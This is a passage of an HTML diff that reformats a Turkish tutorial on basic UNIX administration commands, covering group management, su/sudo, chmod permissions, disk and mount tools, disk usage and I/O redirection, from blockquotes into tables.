-&lt;h4 id=&quot;grup-ile-ilgili-komutlar&quot;&gt;Grup ile ilgili komutlar&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;e-grup-ile-ilgili-komutlar&quot;&gt;E. Grup ile ilgili komutlar&lt;/h3&gt;
 
 &lt;p&gt;UNIX’te tüm kullanıcılar en az bir kullanıcı grubunun üyesidirler&lt;/p&gt;
 &lt;ul&gt;
@@ -192,54 +418,61 @@ karşılığı yoktur&lt;/li&gt;
   &lt;li&gt;Grup parolaları /etc/gshadow dosyasında tutulur&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;blockquote&gt;
-  &lt;p&gt;$groupadd&lt;/p&gt;
-&lt;/blockquote&gt;
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;groupadd&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;Yeni bir çalışma gurubu oluşturmak için&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;groupdel&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;Mevcut bir bir çalışma grubu silmek için komutları kullanılır.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;gpasswd &lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;Bir kullanıcıyı belli bir çalışma grubuna eklemek veya çıkarmak için kullanılır.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;who&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;Sistemde çalışan kullanıcıları, sisteme giriş zamanları ile birlikte listelemektedir.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;w &lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;Sistemde çalışan kullanıcıları ve hangi programları çalıştırdıklarını listelemektedir.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;passwd&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;Parola değişikliği için kullanılır.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;Yeni bir çalışma gurubu oluşturmak için&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;$groupdel&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Mevcut bir bir çalışma grubu silmek için komutları kullanılır.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;$gpasswd&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Bir kullanıcıyı belli bir çalışma grubuna eklemek veya çıkarmak için kullanılır.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;$who&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Sistemde çalışan kullanıcıları, sisteme giriş zamanları ile birlikte listelemektedir.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;$w&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Sistemde çalışan kullanıcıları ve hangi programları çalıştırdıklarını listelemektedir.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;$passwd&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;Parola değişikliği için kullanılır.&lt;/p&gt;
-  &lt;/li&gt;
   &lt;li&gt;
     &lt;p&gt;Sistemdeki kabuk alternatifleri /etc/shells dosyasında yazılıdır.&lt;/p&gt;
   &lt;/li&gt;
@@ -248,25 +481,32 @@ karşılığı yoktur&lt;/li&gt;
   &lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;blockquote&gt;
-  &lt;p&gt;$finger&lt;/p&gt;
-&lt;/blockquote&gt;
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;finger&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;Kullanıcı bilgileri arayıp görüntülenebilir.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
 
-&lt;ul&gt;
-  &lt;li&gt;Kullanıcı bilgileri arayıp görüntülenebilir.&lt;/li&gt;
-&lt;/ul&gt;
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;chfn&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;Komutu ile kullanıcı bilgilerini değiştirilebilir.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
 
-&lt;blockquote&gt;
-  &lt;p&gt;$chfn&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Komutu ile kullanıcı bilgilerini değiştirilebilir.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;$su: Bir kullanıcının başka bir kullanıcının kimliğine bürünmesini sağlar.&lt;/p&gt;
-&lt;/blockquote&gt;
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;su&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;Bir kullanıcının başka bir kullanıcının kimliğine bürünmesini sağlar.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
 
 &lt;ul&gt;
   &lt;li&gt;su (Switch User) – Bir kullanıcının başka bir kullanıcının kimliğine bürünmesini sağlar.
@@ -276,122 +516,224 @@ ile kullanıcı kimliği değiştirildikten sonra exit komutu ile kimlik eski du
 döndürülebilir.&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;blockquote&gt;
-  &lt;p&gt;$sudo: Bir kullanıcının başka bir kullanıcının kimliği ile komut işletmesini
-sağlar.&lt;/p&gt;
-&lt;/blockquote&gt;
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;sudo &lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;Bir kullanıcının başka bir kullanıcının kimliği ile komut işletmesini sağlar.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;sudo – &lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;Bir kullanıcının başka bir kullanıcı kimliği ile bir programı çalıştırmasını sağlar.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;sudo – Bir kullanıcının başka bir kullanıcı kimliği ile bir programı çalıştırmasını sağlar.
-“/etc/sudoers” dosyasındaki yetki tanımlarına uygun olarak kullanıcının programlar
+  &lt;li&gt;“/etc/sudoers” dosyasındaki yetki tanımlarına uygun olarak kullanıcının programlar
 çalıştırabilmesi sağlanır.&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h3 id=&quot;erişim-yetkilerinin-incelenmesi&quot;&gt;Erişim yetkilerinin incelenmesi&lt;/h3&gt;
+&lt;h4 id=&quot;erişim-yetkilerinin-incelenmesi&quot;&gt;Erişim yetkilerinin incelenmesi&lt;/h4&gt;
 
-&lt;ul&gt;
-  &lt;li&gt;rwx (okuma var, yazma var, çalıştırma var)&lt;/li&gt;
-  &lt;li&gt;rw- (okuma var, yazma var, çalıştırma yok)&lt;/li&gt;
-  &lt;li&gt;r– (okuma var, yazma yok, çalıştırma yok)&lt;/li&gt;
-  &lt;li&gt;— (okuma yok, yazma yok, çalıştırma yok)&lt;/li&gt;
-  &lt;li&gt;–x (okuma yok, yazma yok, çalıştırma var)&lt;/li&gt;
-&lt;/ul&gt;
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;rwx&lt;/td&gt;
+      &lt;td&gt;(okuma var, yazma var, çalıştırma var)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;rw-&lt;/td&gt;
+      &lt;td&gt;(okuma var, yazma var, çalıştırma yok)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;r–&lt;/td&gt;
+      &lt;td&gt;(okuma var, yazma yok, çalıştırma yok)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;—&lt;/td&gt;
+      &lt;td&gt;(okuma yok, yazma yok, çalıştırma yok)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;–x&lt;/td&gt;
+      &lt;td&gt;(okuma yok, yazma yok, çalıştırma var)&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
 
-&lt;h3 id=&quot;erişim-yetkilerinin-düzenlenmesi&quot;&gt;Erişim Yetkilerinin Düzenlenmesi&lt;/h3&gt;
+&lt;h4 id=&quot;erişim-yetkilerinin-düzenlenmesi&quot;&gt;Erişim Yetkilerinin Düzenlenmesi&lt;/h4&gt;
 
-&lt;blockquote&gt;
-  &lt;p&gt;$chmod [ugoa][+ – =][rwxst][, …] dosya/dizin&lt;/p&gt;
-&lt;/blockquote&gt;
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$chmod [ugoa][+ – =][rwxst][, …] dosya/dizin&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
 
 &lt;h4 id=&quot;kim&quot;&gt;Kim?&lt;/h4&gt;
 
-&lt;ul&gt;
-  &lt;li&gt;“g” – grubun (group)&lt;/li&gt;
-  &lt;li&gt;“a” – her üçünün de (all)&lt;/li&gt;
-  &lt;li&gt;“u” – sahibinin (user)&lt;/li&gt;
-  &lt;li&gt;“o” – diğerlerinin (other)
-yetkilerinin düzenlenmesi&lt;/li&gt;
-&lt;/ul&gt;
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;“g” –&lt;/td&gt;
+      &lt;td&gt;grubun (group)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;“a” –&lt;/td&gt;
+      &lt;td&gt;her üçünün de (all)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;“u” –&lt;/td&gt;
+      &lt;td&gt;sahibinin (user)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;“o” –&lt;/td&gt;
+      &lt;td&gt;diğerlerinin (other)&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;yetkilerinin düzenlenmesi&lt;/p&gt;
 
 &lt;h4 id=&quot;İşleç&quot;&gt;İşleç&lt;/h4&gt;
 
-&lt;ul&gt;
-  &lt;li&gt;“+” – söz konusu yetkinin verilmesi&lt;/li&gt;
-  &lt;li&gt;“–” – söz konusu yetkinin verilmemesi&lt;/li&gt;
-  &lt;li&gt;“=” – sadece söz konusu yetkinin verilmesi&lt;/li&gt;
-&lt;/ul&gt;
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;“+” –&lt;/td&gt;
+      &lt;td&gt;söz konusu yetkinin verilmesi&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;“–” –&lt;/td&gt;
+      &lt;td&gt;söz konusu yetkinin verilmemesi&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;“=” –&lt;/td&gt;
+      &lt;td&gt;sadece söz konusu yetkinin verilmesi&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
 
 &lt;h4 id=&quot;yetki&quot;&gt;Yetki&lt;/h4&gt;
 
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;“r” –&lt;/td&gt;
+      &lt;td&gt;okuma yetkisi (read)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;“w” –&lt;/td&gt;
+      &lt;td&gt;yazma yetkisi (write)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;“x” –&lt;/td&gt;
+      &lt;td&gt;çalıştırma yetkisi (execute)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;“s” –&lt;/td&gt;
+      &lt;td&gt;sahibi olarak çalıştırma yetkisi (setuid, setgid)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;“t” –&lt;/td&gt;
+      &lt;td&gt;dizine özel yazma yetkisi (sticky)&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h5 id=&quot;Örnek&quot;&gt;Örnek&lt;/h5&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;chmod ugo+x dosya.txt &lt;/strong&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
 &lt;ul&gt;
-  &lt;li&gt;“r” – okuma yetkisi (read)&lt;/li&gt;
-  &lt;li&gt;“w” – yazma yetkisi (write)&lt;/li&gt;
-  &lt;li&gt;“x” – çalıştırma yetkisi (execute)&lt;/li&gt;
-  &lt;li&gt;“s” – sahibi olarak çalıştırma yetkisi (setuid, setgid)&lt;/li&gt;
-  &lt;li&gt;“t” – dizine özel yazma yetkisi (sticky)&lt;/li&gt;
+  &lt;li&gt;Sahibine, gruba ve diğerlerine çalıştırma yetkisi verilmektedir. Son erişim yetkileri “rwxr-xr-x” olmaktadır.&lt;/li&gt;
 &lt;/ul&gt;
-
-&lt;h4 id=&quot;Örnek&quot;&gt;Örnek&lt;/h4&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;$chmod ugo+x dosya.txt&lt;/p&gt;
-  &lt;ul&gt;
-    &lt;li&gt;Sahibine, gruba ve diğerlerine çalıştırma yetkisi verilmektedir. Son erişim yetkileri “rwxr-xr-x” olmaktadır.&lt;/li&gt;
-  &lt;/ul&gt;
-&lt;/blockquote&gt;
 
 &lt;h4 id=&quot;yetkilerin-düzenlenmesi-8-tabanı&quot;&gt;Yetkilerin düzenlenmesi (8 tabanı)&lt;/h4&gt;
 
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;chmod sekiz_tabanında_yetki_sayısı dosya
+&lt;p&gt;chmod sekiz_tabanında_yetki_sayısı dosya
 “r” = 4, “w” = 2, “x” = 1, “-” = 0&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Dosyanın erişim yetkilerinin “rw-r—–” olması için yetki sayısının (4+2+0) (4+0+0)
-(0+0+0) = 6 4 0 olması gerekir.&lt;/p&gt;
-  &lt;/li&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Dosyanın erişim yetkilerinin “rw-r—–” olması için yetki sayısının (4+2+0) (4+0+0)
+(0+0+0) = 6 4 0 olması gerekir.&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;p&gt;Yani şu şekilde de yazılabilir:&lt;/p&gt;
 
-&lt;blockquote&gt;
-  &lt;p&gt;$chmod 640 dosya&lt;/p&gt;
-&lt;/blockquote&gt;
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;chmod 640 dosya&lt;/strong&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
 
-&lt;h4 id=&quot;disklerin-yönetilmesi&quot;&gt;Disklerin Yönetilmesi&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 
-&lt;blockquote&gt;
-  &lt;p&gt;$fdisk&lt;/p&gt;
-&lt;/blockquote&gt;
+&lt;h3 id=&quot;f-disklerin-yönetilmesi&quot;&gt;F. Disklerin Yönetilmesi&lt;/h3&gt;
 
-&lt;blockquote&gt;
-  &lt;p&gt;$gparted&lt;/p&gt;
-&lt;/blockquote&gt;
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;fdisk&lt;/strong&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
 
-&lt;h4 id=&quot;dosya-sistemlerinin-bağlanması&quot;&gt;Dosya Sistemlerinin Bağlanması&lt;/h4&gt;
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;gparted&lt;/strong&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
 
-&lt;blockquote&gt;
-  &lt;p&gt;$mount&lt;/p&gt;
-&lt;/blockquote&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 
-&lt;ul&gt;
-  &lt;li&gt;Dosya sistemini dizin altına bağlar.&lt;/li&gt;
-&lt;/ul&gt;
+&lt;h3 id=&quot;g-dosya-sistemlerinin-bağlanması&quot;&gt;G. Dosya Sistemlerinin Bağlanması&lt;/h3&gt;
 
-&lt;blockquote&gt;
-  &lt;p&gt;$umount&lt;/p&gt;
-&lt;/blockquote&gt;
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;mount&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;Dosya sistemini dizin altına bağlar.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
 
-&lt;ul&gt;
-  &lt;li&gt;Bağlı olan dosya sistemini ayırır&lt;/li&gt;
-&lt;/ul&gt;
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;umount&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;Bağlı olan dosya sistemini ayırır&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
 
-&lt;h4 id=&quot;disk-kullanım-bilgileri&quot;&gt;Disk Kullanım Bilgileri&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 
-&lt;blockquote&gt;
-  &lt;p&gt;$df -k&lt;/p&gt;
-&lt;/blockquote&gt;
+&lt;h3 id=&quot;h-disk-kullanım-bilgileri&quot;&gt;H. Disk Kullanım Bilgileri&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;df -k&lt;/strong&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
 
 &lt;ul&gt;
   &lt;li&gt;
@@ -403,9 +745,13 @@ yetkilerinin düzenlenmesi&lt;/li&gt;
   &lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;blockquote&gt;
-  &lt;p&gt;$du -ks&lt;/p&gt;
-&lt;/blockquote&gt;
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;du -ks&lt;/strong&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
 
 &lt;ul&gt;
   &lt;li&gt;
@@ -417,45 +763,67 @@ ile de sadece toplam kullanım bilgisinin gösterilmesi sağlanmıştır.&lt;/p&
   &lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h4 id=&quot;girdi-Çıktı-yönlendirme&quot;&gt;Girdi Çıktı Yönlendirme&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 
-&lt;blockquote&gt;
-  &lt;p&gt;$program &amp;gt; dosya&lt;/p&gt;
-&lt;/blockquote&gt;
+&lt;h3 id=&quot;i-girdi-Çıktı-yönlendirme&quot;&gt;I. Girdi Çıktı Yönlendirme&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$program &amp;gt; dosya&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
 
 &lt;ul&gt;
   &lt;li&gt;Bir programın çıktısını bir dosyaya yönlendirme .&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;blockquote&gt;
-  &lt;p&gt;$program » dosya&lt;/p&gt;
-&lt;/blockquote&gt;
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$program » dosya&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
 
 &lt;ul&gt;
   &lt;li&gt;Bir program çıktısını mevcut olan bir dosyaya ekleme yaparak
 yönlendirme&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;blockquote&gt;
-  &lt;p&gt;$program &amp;lt; dosya&lt;/p&gt;
-&lt;/blockquote&gt;
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$program &amp;lt; dosya&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
 
 &lt;ul&gt;
   &lt;li&gt;Bir programın standart çıktısını başka bir programa standart girdi olarak
 yönlendirme&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;blockquote&gt;
-  &lt;p&gt;$program2 &amp;gt; dosya&lt;/p&gt;
-&lt;/blockquote&gt;
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$program2 &amp;gt; dosya&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
 
 &lt;ul&gt;
   &lt;li&gt;Bir programın standart hata çıktısını bir dosyaya yönlendirme&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;blockquote&gt;
-  &lt;p&gt;$program &amp;gt; dosya 2&amp;gt;&amp;amp;1&lt;/p&gt;
-&lt;/blockquote&gt;
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$program &amp;gt; dosya 2&amp;gt;&amp;amp;1&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
 
 &lt;ul&gt;
   &lt;li&gt;Bir programın standart çıktısını ve standart hata çıktısını tek bir dosyada
